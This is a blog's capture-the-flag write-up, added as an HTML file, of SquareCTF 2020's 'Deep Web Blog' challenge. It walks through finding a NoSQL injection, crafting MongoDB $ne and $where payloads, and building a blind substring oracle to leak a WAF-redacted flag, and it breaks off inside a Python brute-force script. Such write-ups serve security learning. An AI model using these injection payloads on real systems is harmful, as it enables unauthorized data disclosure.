@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+
+<html lang="en">
+    <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="format-detection" content="telephone=no"/>
+
+    <title>Squarectf 2020: Deep Web Blog | Ajmal&#39;s Website</title>
+
+    
+    
+    <meta name="author" content="Mohammed Ajmal Siddiqui" />
+    <meta name="description" content="This is the writeup for the &amp;ldquo;Deep Web Blog&amp;rdquo; web challenge from SquareCTF 2020, which was worth 200 points and involved a Blind NoSQL Injection attack.
+Challenge statement: A secret informant has tipped us off that hackers on the deep web have been plotting an attack on Square to steal our treasured Bitcoins&amp;hellip;
+Time to find what their plans are. http://challenges.2020.squarectf.com:9541
+" />
+    
+
+    
+    <link rel="canonical" href="https://ajmalsiddiqui.me/ctf-writeups/squarectf-2020-deep-web-blog/" />
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/manifest.json">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#FF3DB4">
+    <meta name="theme-color" content="#ffffff">
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/main.min.fb057fde3b9dd318b0c2197316dfe995dc3eca7f9a0617107e262ab28363c57f.css"/>
+
+    
+    
+    
+
+    
+    
+ 
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-153877586-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script></head>
+
+    <body>
+        
+<nav>
+  <header>
+    <div class="site-title">
+        <a href="/">Ajmal&#39;s Website</a>
+    </div>  
+</header>
+
+  <div class="nav-menu">
+  
+    <a class="color-link nav-link" href="/blog/">Blog</a>
+  
+    <a class="color-link nav-link" href="/ctf-writeups/">CTF Write-Ups</a>
+  
+    <a class="color-link nav-link" href="/book-reviews/">Book Reviews</a>
+  
+    <a class="color-link nav-link" href="/tags/">Tags</a>
+  
+    <a class="color-link nav-link" href="/categories/">Categories</a>
+  
+  <a class="color-link nav-link" href="https://ajmalsiddiqui.me/index.xml" target="_blank" rel="noopener" type="application/rss+xml">RSS</a>
+</div>
+<footer class="footer">
+	<div class="social-icons">
+        
+    <a class="social-icon" href="mailto:ajmalsiddiqui21@gmail.com" target="_blank" rel="noopener" title="Email">
+        <svg width="28px" height="28px" viewBox="0 0 28 28" version="1.1" fill="#ABABAB" xmlns="https://www.w3.org/2000/svg" xmlns:xlink="https://www.w3.org/1999/xlink">
+            <path d="M25.2794292,5.59128519 L14,16.8707144 L2.72057081,5.59128519 C3.06733103,5.30237414 3.51336915,5.12857603 4,5.12857603 L24,5.12857603 C24.4866308,5.12857603 24.932669,5.30237414 25.2794292,5.59128519 Z M25.9956978,6.99633695 C25.998551,7.04004843 26,7.08414302 26,7.12857603 L26,20.871424 C26,21.0798433 25.9681197,21.2808166 25.9089697,21.4697335 L18.7156355,14.2763993 L25.9956978,6.99633695 Z M24.9498374,22.6319215 C24.6672737,22.7846939 24.3437653,22.871424 24,22.871424 L4,22.871424 C3.5268522,22.871424 3.09207889,22.7071233 2.74962118,22.432463 L10.0950247,15.0870594 L13.9848068,18.9768415 L14.1878486,18.7737996 L14.2030419,18.7889929 L17.6549753,15.3370594 L24.9498374,22.6319215 Z M2.00810114,21.0526627 C2.00273908,20.9929669 2,20.9325153 2,20.871424 L2,7.12857603 C2,7.08414302 2.00144896,7.04004843 2.00430222,6.99633695 L9.03436454,14.0263993 L2.00810114,21.0526627 Z"></path>
+        </svg>
+    </a>
+    
+
+    
+
+    
+    <a class="social-icon" href="https://twitter.com/_ajmalsiddiqui" target="_blank" rel="noopener" title="Twitter">
+        <svg width="28px" height="28px" viewBox="0 0 28 28" version="1.1" fill="#ABABAB" xmlns="https://www.w3.org/2000/svg" xmlns:xlink="https://www.w3.org/1999/xlink">
+            <path d="M8.991284,24.971612 C19.180436,24.971612 24.752372,16.530224 24.752372,9.210524 C24.752372,8.970656 24.747512,8.731868 24.736496,8.494376 C25.818008,7.712564 26.758256,6.737 27.5,5.62622 C26.507372,6.067076 25.439252,6.364292 24.318752,6.498212 C25.462472,5.812628 26.340512,4.727444 26.754584,3.434036 C25.684088,4.068536 24.499004,4.53002 23.23724,4.778528 C22.226468,3.701876 20.786828,3.028388 19.193828,3.028388 C16.134404,3.028388 13.653536,5.509256 13.653536,8.567492 C13.653536,9.0023 13.702244,9.424904 13.797176,9.830552 C9.19346,9.599108 5.11106,7.39472 2.3792,4.04294 C1.903028,4.861364 1.629032,5.812628 1.629032,6.827072 C1.629032,8.74904 2.606972,10.445612 4.094024,11.438132 C3.185528,11.41016 2.331788,11.160464 1.585184,10.745096 C1.583888,10.768208 1.583888,10.791428 1.583888,10.815728 C1.583888,13.49888 3.493652,15.738584 6.028088,16.246508 C5.562932,16.373084 5.07326,16.44134 4.56782,16.44134 C4.210988,16.44134 3.863876,16.406024 3.526484,16.34144 C4.231724,18.542264 6.276596,20.143796 8.701412,20.18894 C6.805148,21.674696 4.416836,22.56008 1.821488,22.56008 C1.374476,22.56008 0.93362,22.534592 0.5,22.4834 C2.951708,24.054476 5.862524,24.971612 8.991284,24.971612"></path>
+        </svg>
+    </a>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <a class="social-icon" href="https://linkedin.com/in/ajmal-siddiqui" target="_blank" rel="noopener" title="LinkedIn">
+        <svg width="28px" height="28px" viewBox="0 0 28 28" version="1.1" fill="#ABABAB" xmlns="https://www.w3.org/2000/svg" xmlns:xlink="https://www.w3.org/1999/xlink">
+            <path d="M2,3.654102 C2,2.69908141 2.79442509,1.92397846 3.77383592,1.92397846 L24.2261641,1.92397846 C25.2058917,1.92397846 26,2.69908141 26,3.654102 L26,24.3462148 C26,25.3015521 25.2058917,26.0760215 24.2261641,26.0760215 L3.77383592,26.0760215 C2.79442509,26.0760215 2,25.3015521 2,24.3465315 L2,3.65378524 L2,3.654102 Z M9.27526132,22.1415901 L9.27526132,11.2356668 L5.65030092,11.2356668 L5.65030092,22.1415901 L9.27557808,22.1415901 L9.27526132,22.1415901 Z M7.46341463,9.74691162 C8.72727273,9.74691162 9.51409566,8.90940767 9.51409566,7.86284447 C9.49033893,6.79252455 8.72727273,5.97846056 7.48748812,5.97846056 C6.24675325,5.97846056 5.43649034,6.79252455 5.43649034,7.86284447 C5.43649034,8.90940767 6.22299652,9.74691162 7.4396579,9.74691162 L7.46309788,9.74691162 L7.46341463,9.74691162 Z M11.2815965,22.1415901 L14.9062401,22.1415901 L14.9062401,16.0519481 C14.9062401,15.7263225 14.9299968,15.4000634 15.0256573,15.1675641 C15.2876148,14.5159962 15.8840672,13.8416218 16.8856509,13.8416218 C18.1970225,13.8416218 18.7218879,14.8416218 18.7218879,16.3078872 L18.7218879,22.1415901 L22.3465315,22.1415901 L22.3465315,15.8885017 C22.3465315,12.5388027 20.5584416,10.9800443 18.1735825,10.9800443 C16.2182452,10.9800443 15.3595185,12.072854 14.8824834,12.8172315 L14.9065569,12.8172315 L14.9065569,11.2359835 L11.2819132,11.2359835 C11.3291099,12.2591067 11.2815965,22.1419069 11.2815965,22.1419069 L11.2815965,22.1415901 Z"></path>
+        </svg>
+    </a>
+    
+
+    
+    <a class="social-icon" href="https://medium.com/@ajmalsiddiqui21" target="_blank" rel="noopener" title="Medium">
+        <svg width="28px" height="28px" viewBox="0 0 28 28" version="1.1" fill="#ABABAB" xmlns="https://www.w3.org/2000/svg" xmlns:xlink="https://www.w3.org/1999/xlink">
+            <path d="M2,2 L26,2 L26,26 L2,26 L2,2 Z M7.72727142,10.0265545 L7.72727142,17.1527156 C7.77112416,17.4097828 7.69008764,17.6723786 7.50898513,17.8600642 L5.81538462,19.9143852 L5.81538462,20.1852847 L10.617683,20.1852847 L10.617683,19.9143852 L8.92408245,17.8600642 C8.74165168,17.6726892 8.65559727,17.4118239 8.69074193,17.1527156 L8.69074193,10.9897526 L12.9059255,20.1852847 L13.3951878,20.1852847 L17.0157294,10.9897526 L17.0157294,18.3190884 C17.0157294,18.514738 17.0157294,18.5523628 16.8877685,18.6802876 L15.5855778,19.9444852 L15.5855778,20.2153846 L21.9083531,20.2153846 L21.9083531,19.9444852 L20.6513252,18.7103876 C20.5403599,18.6258033 20.4853154,18.4867833 20.50831,18.3491883 L20.50831,9.28158097 C20.4853154,9.14398599 20.5403599,9.00496587 20.6513252,8.92038167 L21.9384615,7.68628409 L21.9384615,7.41538462 L17.4824105,7.41538462 L14.3059685,15.3391941 L10.6929541,7.41538462 L6.01861668,7.41538462 L6.01861668,7.68628409 L7.52403936,9.49980554 C7.67182769,9.63301305 7.74730311,9.82863473 7.72727142,10.0265545 Z"></path>
+        </svg>
+    </a>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    
+    
+    <a class="social-icon" href="https://github.com/ajmalsiddiqui" target="_blank" rel="noopener" title="GitHub">
+        <svg width="28px" height="28px" viewBox="0 0 28 28" version="1.1" fill="#ABABAB" xmlns="https://www.w3.org/2000/svg" xmlns:xlink="https://www.w3.org/1999/xlink">
+            <path d="M13.9988029,1.32087331 C6.82105037,1.32087331 1,7.14112562 1,14.3212723 C1,20.0649109 4.72454649,24.9370678 9.89038951,26.6560892 C10.5408085,26.7757983 10.7778323,26.374374 10.7778323,26.0296121 C10.7778323,25.7215609 10.7666595,24.9035493 10.760275,23.8189856 C7.14426471,24.6042767 6.38131925,22.0760223 6.38131925,22.0760223 C5.78995672,20.5740732 4.93762853,20.1742451 4.93762853,20.1742451 C3.75729765,19.3682044 5.02701126,19.3841656 5.02701126,19.3841656 C6.33183953,19.4759425 7.01817121,20.7241085 7.01817121,20.7241085 C8.17775254,22.7104801 10.0611744,22.1366749 10.8017741,21.8038838 C10.919887,20.9643246 11.2558703,20.3913175 11.6269683,20.066507 C8.74038491,19.7385043 5.70536235,18.6228163 5.70536235,13.6413251 C5.70536235,12.2223743 6.21213051,11.0611968 7.04370914,10.1530044 C6.90963504,9.82420367 6.46351945,8.50181809 7.17139875,6.71256734 C7.17139875,6.71256734 8.26234691,6.36301702 10.7459099,8.04532771 C11.78259,7.75642995 12.8950858,7.61277914 14.000399,7.60719272 C15.1049142,7.61277914 16.2166119,7.75642995 17.2548881,8.04532771 C19.736855,6.36301702 20.8262071,6.71256734 20.8262071,6.71256734 C21.5356825,8.50181809 21.0895669,9.82420367 20.9562909,10.1530044 C21.7894656,11.0611968 22.2922435,12.2223743 22.2922435,13.6413251 C22.2922435,18.6355852 19.2524325,19.734514 16.3570705,20.0561322 C16.8231376,20.4575564 17.2389269,21.2508282 17.2389269,22.4638795 C17.2389269,24.2012564 17.2229657,25.603448 17.2229657,26.0296121 C17.2229657,26.3775663 17.4575954,26.7821827 18.116793,26.6552912 C23.2786458,24.9322794 27,20.0633148 27,14.3212723 C27,7.14112562 21.1789496,1.32087331 13.9988029,1.32087331"></path>
+        </svg>
+    </a>
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+</div>
+
+
+
+
+    <p><a href="https://github.com/kimcc/hugo-theme-noteworthy" target="_blank" rel="noopener">Noteworthy theme</a></p>
+    <p><a href="https://gohugo.io" target="_blank" rel="noopener">Built with Hugo</a></p>
+
+	<script src="/js/main.min.a7205ef73b078c8daed6fe1b0826e8ba229ffabbb69d299d9446cf41f2c7d8aa.js" integrity="sha256-pyBe9zsHjI2u1v4bCCbouiKf+ru2nSmdlEbPQfLH2Ko=" crossorigin="anonymous"></script>
+</footer>
+
+</nav>
+
+        <div id="content" class="content-container">
+        
+
+<h1 class="post-title">Squarectf 2020: Deep Web Blog</h1>
+    
+    <time>November 14, 2020</time>
+    
+    <div>
+        <p>
+        <p>This is the writeup for the &ldquo;Deep Web Blog&rdquo; web challenge from <a href="https://squarectf.com/" title="SquareCTF 2020">SquareCTF 2020</a>, which was worth 200 points and involved a Blind NoSQL Injection attack.</p>
+<p>Challenge statement: A secret informant has tipped us off that hackers on the deep web have been plotting an attack on Square to steal our treasured Bitcoins&hellip;</p>
+<p>Time to find what their plans are.
+<a href="http://challenges.2020.squarectf.com:9541">http://challenges.2020.squarectf.com:9541</a></p>
+<h2 id="tldr-hack-steps">TLDR; Hack Steps</h2>
+<p>This is a Bling NoSQL Injection attack.</p>
+<ol>
+<li>Recognize the NoSQL Injection vulnerability using this payload: <code>GET /api/posts?title[%24ne]=</code>.</li>
+<li>Develop an exploit that attempts to scan for the string &ldquo;flag&rdquo; in the post contents using the MongoDB <code>$where</code> operator: <code>/api/posts?%24where=function(){return%20this.content.includes('flag')}</code>.</li>
+<li>The response returned for the above injection payload tells us that the flag contents have been redacted by the server. Develop a script that lets us enumerate the characters in the flag based on this response (see section titled <strong>Enumerating the Flag Alphabet</strong>).</li>
+<li>Adapt the script from step 3 to leak the flag using the alphabet that we enumerated and the response of the server (see the section titled <strong>Disclosing the Flag</strong>).</li>
+<li><code>Pr0f1t!</code></li>
+</ol>
+<h2 id="doing-the-recon">Doing the Recon</h2>
+<p>The URL given takes us to a blog-like web interface with very limited functionality - all we see are a few posts and a search option, which seems to filter based on the search terms being in the title. Given that there is literally nothing else here, it was obvious that the search function was to be exploited somehow.</p>
+<p>I started with a few benign strings like &ldquo;test&rdquo; and &ldquo;hello&rdquo; to get a feel for how it works, and then tried a few SQL injection tests to see if something turns up. Nothing did. I did look at the response headers using Chrome DevTools and noticed the <code>X-Powered-By: Express</code> response header, which is typically sent by a server that uses the ExpressJS framework, which is a popular routing and middlware framework for NodeJS. This made me consider the possibility that MongoDB was being used as the database, and I kept the possibility of noSQL injection in the back of my head. At this point, it was time to get serious and bring out the H4X0R tools - Burp.</p>
+<p>With Burp fired up, and after making sure the browser is configured to use Burp as a proxy and that the proxy is turned on and <em>not</em> in intercepting mode (so that we can go over the website manually and have Burp record everything), I visited the URL again, made a couple of searches (one which yields a result - &ldquo;test&rdquo;, and another which turns up empty - &ldquo;hello&rdquo;). From the HTTP History section of the proxy, I found the requests associated with the website and sent them to Burp repeater so that I can play with them.</p>
+<p>With this setup, we can start poking around.</p>
+<p>Right off the bat, we look at the search request we made and see that there is an API that seems to take care of the search at <code>/api/posts</code>, which takes a query parameter <code>title</code> and searches based on that. Repeating this request gives us a <code>304 Not Modified</code> response, which means the cached query from a previous search is still valid. However, we want to see the actual responses of our queries, and we can indicate that we don&rsquo;t have a cached response/our cached response is invalid by modifying or removing the <code>If-None-Match</code> header (see note below if you want to know why).</p>
+<blockquote>
+<p>Note: Without going into too much detail, the caching mechanism here relies on the <code>Etag</code> header included in the response of an HTTP request. This header is like a &ldquo;tag&rdquo; for the resource returned in the HTTP response. The browser/HTTP client can use this Etag with request headers like <code>If-None-Match</code> or <code>If-Modified-Since</code> headers, and if the servers deems that the cache entry is still valid, it will indicate this to the client with the 304 response, which implicitly asks the client to use the cached entry.</p>
+</blockquote>
+<p>Here&rsquo;s a sample of the API response for the search query &ldquo;test&rdquo;:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;_id&#34;</span>: <span style="color:#e6db74">&#34;5faf26f272de010007670897&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;title&#34;</span>: <span style="color:#e6db74">&#34;test&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;content&#34;</span>: <span style="color:#e6db74">&#34;It works!&#34;</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><p>For starters, I tried to see if I could search based on fields other that the title (say using the <code>content</code> field) using a request like this:</p>
+<pre tabindex="0"><code>GET /api/posts?content=test
+</code></pre><p>But this didn&rsquo;t lead to anything interesting.</p>
+<p>The API response, which is JSON, has an <code>_id</code> field for each post that was returned. This confirmed my suspicions that MongoDB was being used as the DB here, since the <code>_id</code> field is characteristic of MongoDB (I honestly don&rsquo;t know if other NoSQL DBs use the same field). At this point, I decided to explore the possibility of NoSQL injection - the little known cousin of SQLi that is used against noSQL databases. Yep, noSQL doesn&rsquo;t automatically mean no injection. :)</p>
+<h2 id="finding-the-nosqli-vulnerability">Finding the NoSQLi Vulnerability</h2>
+<p>I started with trying characters like <code>' &quot; \</code> which might help me break out of the context of the search query, but I wasn&rsquo;t very successful. Since I knew nothing about NoSQLi beyond the fact that it exists, I did some research. You can find a few useful links in the NoSQLi links section towards the end of the write-up. The most useful was <a href="https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf" title="OWASP NoSQLi">this primer to NoSQLi by OWASP</a>, from which I found a payload that was used to effect a login bypass in the examples, but in our case will show us all the posts in the DB (which is what the API returns by default).</p>
+<pre tabindex="0"><code>GET /api/posts?title[%24ne]=
+</code></pre><p>Which basically translates to the MongoDB query (we&rsquo;re assuming the DB is called <code>posts</code>, though we don&rsquo;t really care about this):</p>
+<pre tabindex="0"><code>db.posts.find({&#34;title&#34;: {&#34;$ne&#34;:&#34;&#34;}})
+</code></pre><p>This basically says, &ldquo;give me everything in the DB where <code>title</code> does not equal <code>&quot;&quot;</code>&rdquo;, i.e. the empty string. Since everything has a title, this returns all the documents in the collection!</p>
+<p>NoSQLi vulnerability confirmed!</p>
+<h2 id="understanding-the-level-of-control">Understanding the Level of Control</h2>
+<p>I spent some time with the MongoDB docs trying to see what kind of query operators existed and whether any of them could be used for things like revealing hidden documents, enumerating collections, remote code execution (yes, I know, I&rsquo;m an optimistic hacker!), etc. I also explored a few things such as giving invalid query parameters (such as <code>abcd</code>). I didn&rsquo;t have much luck with any of this, but then something clicked:</p>
+<pre tabindex="0"><code>/api/posts?%24ne=
+</code></pre><p>And that threw a <code>500 Internal Server Error</code> with this error message:</p>
+<pre tabindex="0"><code>unknown top level operator: $ne
+</code></pre><p>This is interesting! A quick google search tells us that the <code>$ne</code> operator can only be used with a field (and not at the top level, as the error message indicates). So for example this is valid:</p>
+<pre tabindex="0"><code>db.posts.find({&#34;title&#34;: {&#34;$ne&#34;:&#34;&#34;}})
+</code></pre><p>But this isn&rsquo;t:</p>
+<pre tabindex="0"><code>db.posts.find({&#34;$ne&#34;:&#34;&#34;})
+</code></pre><p>This tells us that we can control top level operators! Sweet, we now have a lot more options.</p>
+<p>I went over the MongoDB docs and searched for interesting operators that I could use, but the process of trying an operator by making a query to the vulnerable website was getting cumbersome. So I decided to set up a better environment to develop the exploit.</p>
+<h2 id="setting-up-an-exploit-development-environment">Setting Up an Exploit Development Environment</h2>
+<p>Okay, I&rsquo;ll say this right off the bat - I didn&rsquo;t do anything that was even remotely as fancy as &ldquo;setting up an exploit development environment&rdquo; might sound. But I&rsquo;m turning this into a separate section to highlight that it is <strong>extremely important</strong> for a hacker to be able to replicate the target environment as much as possible, and use it to get familiar with the stuff to be exploited, test exploits, explore the environment, etc.</p>
+<p>Trust me, I&rsquo;ve failed CTF challenges in the past because I didn&rsquo;t make the effort of setting things up locally.</p>
+<p>Anyways, here we don&rsquo;t have to do much. I just spun up a mongodb server locally (it isn&rsquo;t hard to install mongo, though in my case I had it installed already since I work with the MERN stack sometimes) and created a new database:</p>
+<pre tabindex="0"><code>use db nosqli
+db.posts.insertMany(&lt;copy-paste the array of posts returned by the API&gt;)
+</code></pre><p>We can then replicate the search functionality using something like</p>
+<pre tabindex="0"><code># title=test
+
+db.posts.find({&#34;title&#34;: &#34;test&#34;})
+# Returns the post titled &#34;test&#34;
+</code></pre><p>And our exploit PoC from earlier would translate to</p>
+<pre tabindex="0"><code># title[%24ne]=
+
+db.posts.find({&#34;title&#34;: {&#34;$ne&#34;: &#34;&#34;}})
+# Returns all the posts
+</code></pre><p>At this point, we can easily play with various operators and queries, and when we like something, we can inject the query into the vulnerable application via Burp and see how it responds.</p>
+<p>Let&rsquo;s continue!</p>
+<h2 id="exploiting-the-nosqli">Exploiting the NoSQLi</h2>
+<p>As I was going over the MongoDB docs, I came across an interesting top level operator: <a href="https://docs.mongodb.com/manual/reference/operator/query/where/#op._S_where" title="MongoDB $where Operator">the $where operator</a>. Basically, this allows you to <em>run a JavaScript function over each document in the collection in order to filter the items you need</em>. This immediately spelled &ldquo;JavaScript RCE&rdquo; to be in big, bold letters, so I dove in. However, I quickly realised that I wasn&rsquo;t getting a reverse shell on the server anytime soon. Heck, I wasn&rsquo;t even going to get a <code>console.log</code>! Not only is the JS allowed in a <code>$where</code> function restricted, but the return value of the function is treated as a boolean. If it is truthy, the document will be included in the results, and if it is falsey, it will be skipped.</p>
+<p>In other words, no matter what I do,</p>
+<ol>
+<li>I can&rsquo;t execute arbitrary code on the server</li>
+<li>I can&rsquo;t see any output. I can just filter the documents in the collection based on a custom function.</li>
+</ol>
+<p>For example, the following mongoDB query (and the corresponding injected query in Burp) would return everything:</p>
+<pre tabindex="0"><code># MongoDB Query
+db.posts.find({$where: function(){return true}})
+
+# URL with query injected
+/api/posts?%24where=function(){return%20true}
+</code></pre><p>That&rsquo;s quite limiting.</p>
+<p>I spent quite a long time stuck at this point, and I was quite frustrated, before an idea hit me. What if I use the <code>$where</code> query and the function I control to explore the collection further and see if I can find something interesting?</p>
+<p>For example, I know that all the flags in SquareCTF 2020 are of the format <code>flag{s0m3_t3xt_h3r3}</code>, so if the flag is in one of posts (which is hidden somehow), it must contain the string &ldquo;flag&rdquo;, right?</p>
+<p>First, I created a MongoDB query that uses <code>$where</code> and a JS function that can find posts which contain the word &ldquo;test&rdquo; in them in my local Mongo shell. This was trivial:</p>
+<pre tabindex="0"><code>db.posts.find({&#34;$where&#34;: &#34;function(){return this.content.includes(&#39;test&#39;)}&#34;})
+# Returns a single post, which has the word &#34;test&#34; in it somewhere
+</code></pre><blockquote>
+<p>Note that <code>this</code> within a <code>$where</code> function is bound to the document being filtered, and the <code>includes</code> method in JavaScript checks for substrings</p>
+</blockquote>
+<p>We can then convert this into a URL query with an injection as follows:</p>
+<pre tabindex="0"><code>/api/posts?%24where=function(){return%20this.content.includes(&#39;test&#39;)}
+# Returns the same single post that the mongo query returne earlier
+</code></pre><blockquote>
+<p>While experimenting with this, I was able to get an error implying a missing <code>&quot;</code> in a script, which might hint that a breakout from the context of the query is possible, but I didn&rsquo;t explore this possibility further. I may be completely wrong about this. Still, it is interesting for a hacker to note such errors.</p>
+</blockquote>
+<p>Nice! Now we can try something more ambitious, such as looking for the string &ldquo;flag&rdquo; in the content. Here&rsquo;s the query:</p>
+<pre tabindex="0"><code>/api/posts?%24where=function(){return%20this.content.includes(&#39;flag&#39;)}
+</code></pre><p>This leads us to a interesting response:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;_id&#34;</span>: <span style="color:#e6db74">&#34;5faf26f272de010007670898&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;title&#34;</span>: <span style="color:#e6db74">&#34;flag&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;content&#34;</span>: <span style="color:#e6db74">&#34;Looking for a flag? You won&#39;t find it here. Maybe this can help: https://www.youtube.com/watch?v=Jbix9y8iV38&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;flag&#34;</span>: <span style="color:#e6db74">&#34;[REDACTED] Flag format detected - redacted by WAF&#34;</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><p>SO CLOSE!</p>
+<p>It looks like we&rsquo;ve come a long way, but we&rsquo;re not quite there yet. There are a few interesting things in this response that lets us investigate further (the video link in the content is interesting, and I watched a few minutes of it as well, but I quickly realised it <em>won&rsquo;t</em> help with finding the flags that we need. Still, nice one, organizers!):</p>
+<ol>
+<li>There is a <em>new</em> field here called <code>flag</code></li>
+<li>It says that the <code>flag</code> field was &ldquo;redacted by WAF&rdquo;</li>
+</ol>
+<p>A WAF refers to a Web Application Firewall. In other words, something is looking at the responses sent by the server and filtering out the flag! Outrageous!</p>
+<p>Looks like we will have to chain a WAF bypass with the NoSQLi that we just exploited in order to get the flag.</p>
+<p>Or do we?</p>
+<h2 id="disclosing-the-flag-without-bypassing-the-waf">Disclosing the Flag Without Bypassing the WAF</h2>
+<p>Though I did try and see if I could fathom out the behaviour of the WAF (mostly looking at whether mongo will let me control formatting of the documents returned withing the query itself, as opposed to a standard MongoDB projection, which I didn&rsquo;t have control over), I really wasn&rsquo;t in a mood for this.</p>
+<p>So I came up with another idea.</p>
+<p>We need to figure out what the flag is, and we have a method that tells us if <em>a substring is a part of the content of a post</em>. We also know that the search results are a JSON array, which can be empty if there are no results.</p>
+<p>And that is a vulnerability.</p>
+<p>Sure, the WAF can prevent us from getting the flag in the response, but if we can make it tell us if a certain substring is a part of the flag, we can slowly figure out the flag ourselves!</p>
+<p>In order to pull this off, we&rsquo;ll need a couple of things:</p>
+<ol>
+<li>We only want to target the document that contains the flag</li>
+<li>We want to test if the <code>flag</code> field contains a substring that we supply to it</li>
+</ol>
+<p>This is relatively easy. Here&rsquo;s a <code>$where</code> query that does just that (note: you can add a dummy record to your local mongoDB with the API response from earlier and a fake value of <code>flag</code> to actually try this. I didn&rsquo;t need to, so I&rsquo;ll skip it here):</p>
+<pre tabindex="0"><code># We&#39;re testing to see if the substring `flag` exists in the flag
+# I&#39;ve prettified this here, but you don&#39;t need all the whitespace
+db.posts.find({&#34;$where&#34;: &#34;function(){
+  if(this.flag!=undefined){
+    return this.flag.includes(&#39;flag&#39;)
+  } else {
+    return false
+  }
+}&#34;})
+# returns nothing if you haven&#39;t added the dummy document with the flag, returns said document otherwise
+</code></pre><p>And this is the equivalent query:</p>
+<pre tabindex="0"><code>/api/posts?%24where=function(){if%20(this.flag!=undefined){return%20this.flag.includes(&#39;flag&#39;)}else{return%20false}}
+</code></pre><p>This returns the single record containing the response we saw earlier, with the flag redacted. However, if you check for a substring that <em>isn&rsquo;t</em> a part of the flag, you get an empty array. For example, this query string returnsan empty array:</p>
+<pre tabindex="0"><code>/api/posts?%24where=function(){if%20(this.flag!=undefined){return%20this.flag.includes(&#39;flag1234&#39;)}else{return%20false}}
+</code></pre><p>With this knowledge, we can start disclosing the flag.</p>
+<h2 id="enumerating-the-flag-alphabet">Enumerating the Flag Alphabet</h2>
+<p>My idea was to write a bruteforce script that incrementally builds the flag based on the responses by the server. However, with a potential alphabet of nearly 65 characters, and an O(n^2) iteration algorithm (as you will see in the next section), with each iteration making and waiting for a network call, this would take quite a while. So let&rsquo;s start with figuring out the characters that the flag contains.</p>
+<p>Here&rsquo;s a python script that does just that, with explanatory comments.</p>
+<blockquote>
+<p>Tip: The easiest way to get scripting is to right click on the request in Burp, select <code>Copy as curl command</code>, ssearch for a &ldquo;curl to python requests converter&rdquo; online, and use the converter to generate the code. That&rsquo;s what I did here, hence the bloated headers.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">req</span>(param):
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Headers as they were present in the request</span>
+</span></span><span style="display:flex;"><span>  headers <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Host&#39;</span>: <span style="color:#e6db74">&#39;challenges.2020.squarectf.com:9542&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;User-Agent&#39;</span>: <span style="color:#e6db74">&#39;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Accept&#39;</span>: <span style="color:#e6db74">&#39;application/json, text/plain, */*&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Accept-Language&#39;</span>: <span style="color:#e6db74">&#39;en-US,en;q=0.5&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Accept-Encoding&#39;</span>: <span style="color:#e6db74">&#39;gzip, deflate&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Origin&#39;</span>: <span style="color:#e6db74">&#39;http://challenges.2020.squarectf.com:9541&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Connection&#39;</span>: <span style="color:#e6db74">&#39;close&#39;</span>,
